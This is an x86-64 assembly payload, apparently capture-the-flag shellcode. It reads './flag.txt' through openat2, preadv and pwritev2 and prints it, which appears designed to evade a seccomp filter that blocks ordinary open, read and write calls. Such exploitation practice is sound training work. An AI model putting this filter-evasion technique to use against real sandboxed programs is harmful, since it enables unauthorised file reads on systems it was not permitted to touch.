BITS 64
DEFAULT REL
SECTION .text
global _start
_start:
    lea rax, [rel buf]
    mov [rel iov], rax

    ; fd = openat2(AT_FDCWD, path, &how, sizeof(how))
    mov eax, 437
    mov edi, -100
    lea rsi, [rel path]
    lea rdx, [rel how]
    mov r10d, 24
    syscall
    test eax, eax
    js exit

    ; n = preadv(fd, &iov, 1, 0)
    mov edi, eax
    mov eax, 295
    lea rsi, [rel iov]
    mov edx, 1
    xor r10d, r10d
    xor r8d, r8d
    syscall
    test eax, eax
    jle exit

    mov [rel iov+8], rax

    ; pwritev2(1, &iov, 1, -1, -1, 0)
    mov eax, 328
    mov edi, 1
    lea rsi, [rel iov]
    mov edx, 1
    mov r10, -1
    mov r8, -1
    xor r9d, r9d
    syscall

exit:
    mov eax, 60
    xor edi, edi
    syscall

path: db './flag.txt', 0
align 8
how:
    dq 0
    dq 0
    dq 0
iov:
    dq 0
    dq 0x200
buf:
    times 0x200 db 0
